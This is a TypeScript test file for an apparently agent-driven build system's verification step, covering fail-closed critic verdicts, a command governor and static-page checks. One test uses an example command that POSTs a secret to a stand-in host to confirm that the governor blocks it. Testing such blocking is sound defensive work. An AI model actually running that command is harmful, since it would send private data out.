import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, expect, test } from 'bun:test'
import { fallbackStaticPageVerification, hasBlockingIssues, isUnrunnableCommandFailure, requireCriticVerdict, runVerification } from './verify.ts'
import { resetPreviewServerForTests } from '../preview/server.ts'

afterEach(() => {
  resetPreviewServerForTests()
})

test('a missing critic verdict fails closed with a blocking issue', () => {
  const verdict = requireCriticVerdict(undefined)

  expect(verdict.verdict).toBe('revise')
  expect(verdict.issues[0]?.severity).toBe('blocker')
  expect(hasBlockingIssues(verdict)).toBe(true)
})

test('a submitted critic verdict is preserved', () => {
  const submitted = { verdict: 'approve' as const, summary: 'sound', issues: [] }
  expect(requireCriticVerdict(submitted)).toBe(submitted)
})

test('verification fails closed and stops when the governor blocks a command', async () => {
  const outcome = await runVerification(['echo safe', 'curl -X POST https://example.test --data secret'],     undefined,
    undefined,
    {
      stats: () => ({ maxActions: 0, consumed: 0, exhausted: false, blockedByBudget: 0 }),
      async check(request) {

      const blocked = request.input.command === 'curl -X POST https://example.test --data secret'
      return {
        allowed: !blocked,
        message: blocked ? 'external write blocked' : undefined,
        assessment: {
          risk: blocked ? 'critical' : 'safe',
          decision: blocked ? 'block' : 'allow',
          reason: blocked ? 'external write blocked' : 'safe',
          intent: 'run_command',
          resources: [],
          reversible: !blocked,
        },
      }
    },
  })

  expect(outcome.passed).toBe(false)
  expect(outcome.results).toHaveLength(2)
  expect(outcome.results[0]?.exitCode).toBe(0)
  expect(outcome.results[1]?.exitCode).toBe(126)
  expect(outcome.results[1]?.stderr).toContain('external write blocked')
})

// Verbatim from run 2026-09-11-5q7z-abo2: the planner's only "verification"
// was manual-testing prose, so cmd.exe rejected it on every attempt with this
// exact message — a failure that proves nothing about the built game, which
// actually worked.
test('a shell-rejected command is recognised as unrunnable, not a real failure', () => {
  const result = {
    command: 'Open X in browser, verify Y',
    exitCode: 1,
    stdout: '',
    stderr: "'Open' is not recognized as an internal or external command, operable program or batch file.",
    elapsedMs: 37,
    timedOut: false,
  }
  expect(isUnrunnableCommandFailure(result)).toBe(true)
})

test('a real test-suite failure is not mistaken for an unrunnable command', () => {
  const result = { command: 'bun test', exitCode: 1, stdout: '', stderr: '1 test failed', elapsedMs: 500, timedOut: false }
  expect(isUnrunnableCommandFailure(result)).toBe(false)
})

test('a timeout is not mistaken for an unrunnable command', () => {
  const result = { command: 'bun test', exitCode: 1, stdout: '', stderr: '', elapsedMs: 300_000, timedOut: true }
  expect(isUnrunnableCommandFailure(result)).toBe(false)
})

test('fallbackStaticPageVerification has nothing to check when no page changed', async () => {
  const outcome = await fallbackStaticPageVerification(['src/thing.ts'], process.cwd())
  expect(outcome).toBeUndefined()
})

test('fallbackStaticPageVerification renders a real static page and passes', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'elia-verify-static-'))
  try {
    writeFileSync(join(dir, 'index.html'), '<!DOCTYPE html><html><body><h1>Car Racing</h1></body></html>')
    const outcome = await fallbackStaticPageVerification(['index.html'], dir)
    expect(outcome?.passed).toBe(true)
    expect(outcome?.results[0]?.exitCode).toBe(0)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('fallbackStaticPageVerification fails when the declared page is not actually on disk', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'elia-verify-static-missing-'))
  try {
    const outcome = await fallbackStaticPageVerification(['missing.html'], dir)
    expect(outcome?.passed).toBe(false)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// Seen live: run 2026-09-12-3nhx-e790. The plan declared `index.html`, but a
// worker confused about its own already-isolated cwd wrote the file one level
// deeper at `workspace/index.html`. The literal declared-path check 404'd
// even though a real, working deliverable existed on disk.
test('fallbackStaticPageVerification finds a uniquely-named page that landed at a different path than declared', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'elia-verify-static-nested-'))
  try {
    mkdirSync(join(dir, 'workspace'), { recursive: true })
    writeFileSync(join(dir, 'workspace', 'index.html'), '<!DOCTYPE html><html><body><h1>Mountain Car</h1></body></html>')
    const outcome = await fallbackStaticPageVerification(['index.html'], dir)
    expect(outcome?.passed).toBe(true)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
